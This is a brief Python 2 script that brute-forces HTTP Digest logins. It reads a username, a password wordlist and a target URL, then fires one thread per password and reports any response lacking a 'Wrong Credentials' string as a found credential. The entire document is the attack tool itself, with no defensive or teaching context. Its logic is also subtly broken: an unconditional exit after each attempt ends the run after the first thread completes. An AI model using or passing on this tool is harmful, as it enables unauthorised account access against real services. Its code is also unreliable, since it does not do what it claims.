#use python 2
import requests, thread, os
from time import sleep
user = raw_input('User: ')
wordlist = raw_input('Wordlist: ')
target = raw_input('Target: ')
passwords = open(wordlist)

def bf(target, passwd):
	print('\nTrying user:{} and pass:{}').format(user, passwd)
	from requests.auth import HTTPDigestAuth
	login = requests.get(target, auth = HTTPDigestAuth(user, passwd))
	if 'Wrong Credentials' not in login.text:
		print('\n\033[92mFound! User:{}, Pass:{}\033[0m').format(user, passwd)
	os._exit(0)

for passwd in passwords:
	passwd = passwd.rstrip()
	thread.start_new_thread(bf, (target, passwd))
while True:
	sleep(0.1)
